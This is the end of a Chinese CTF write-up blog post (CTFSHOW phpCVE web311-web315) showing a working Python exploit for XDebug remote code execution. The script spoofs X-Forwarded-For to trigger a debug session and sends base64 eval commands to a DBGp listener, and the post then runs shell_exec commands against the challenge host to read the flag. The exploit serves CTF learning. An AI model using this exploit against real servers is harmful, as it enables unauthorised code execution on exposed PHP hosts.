class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data from %s&#x27;</span>, <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(<span class="variable language_">self</span>.server.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line">        data = recv_xml(<span class="variable language_">self</span>.request)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">        g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">            logging.warning(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        data = g.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">            server_done.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] May be not string result: %s&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, handler_class, code</span>):</span><br><span class="line">        <span class="variable language_">self</span>.code = code</span><br><span class="line">        <span class="variable language_">self</span>.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(server_address, handler_class)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">server_activate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().server_activate()</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Server %s started&#x27;</span>, <span class="variable language_">self</span>.server_address)</span><br><span class="line">        server_started.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_dbgp_server</span>(<span class="params">port: <span class="built_in">int</span>, code: <span class="built_in">str</span></span>):</span><br><span class="line">    server = XDebugServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, port), XDebugRequestHandler, code)</span><br><span class="line">    server_thread = threading.Thread(target=server.serve_forever, daemon=<span class="literal">True</span>)</span><br><span class="line">    server_thread.start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> server_thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_debug_session</span>(<span class="params">url: <span class="built_in">str</span>, attack_ip: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_started.wait(timeout=<span class="number">5</span>)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Trigger debug session&#x27;</span>)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> attack_ip:</span><br><span class="line">            headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>] = attack_ip</span><br><span class="line"></span><br><span class="line">        requests.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1&#x27;</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--dbgp-ip&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;dbgp server ip address, must can be accessed from target server.&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    start_dbgp_server(<span class="number">9000</span>, args.code)</span><br><span class="line">    start_dbgp_server(<span class="number">9003</span>, args.code)</span><br><span class="line">    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Wait with a timeout, but check for interrupts</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span> server_done.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] Execution timed out&#x27;</span>)            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logging.info(<span class="string">&#x27;[*] Received keyboard interrupt, exiting...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>然后执行命令，这里用题目给的备用地址<a target="_blank" rel="noopener" href="http://pwn.challenge.ctf.show:28100/">http://pwn.challenge.ctf.show:28100/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c <span class="string">&#x27;shell_exec(&quot;ls&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810215040209.png"></p>
<p><code>cat flaaaxx.php</code>即可，成功拿到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c <span class="string">&#x27;shell_exec(&quot;cat flaaaxx.php&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://oss.waynejoons.icu/picphoto/20250810214935811.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;8838-562d8118-4706-427f-8be2-a89a45c752cb&#125;</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW | phpCVE题解 web311 - web315</p><p><a href="https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/">https://waynejoon.github.io/posts/ctfshow-phpcve-web311-web315/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WayneJoon.H</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-08-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CTFSHOW/">CTFSHOW </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/ctfshow-nodejs-web334-web344/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CTFSHOW | nodejs题解 web334 - web344</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/ctfshow-code-audit-web301-web310/"><span class="level-item">CTFSHOW | 代码审计 web301 - web310</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/waynejoon.jpg" alt="WayneJoon.H"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">WayneJoon.H</p><p class="is-size-6 is-block">记录学习生活</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">32</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">7</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/waynejoon" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#题目列表"><span class="level-left"><span class="level-item">1</span><span class="level-item">题目列表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web311"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">web311</span></span></a></li><li><a class="level is-mobile" href="#web312"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">web312</span></span></a></li><li><a class="level is-mobile" href="#web313"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">web313</span></span></a></li><li><a class="level is-mobile" href="#web314"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">web314</span></span></a></li><li><a class="level is-mobile" href="#web315"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">web315</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">WayneJH</a><p class="is-size-7"><span>&copy; 2025 WayneJoon.H</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script data-pjax src="/js/busuanzi-fix.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>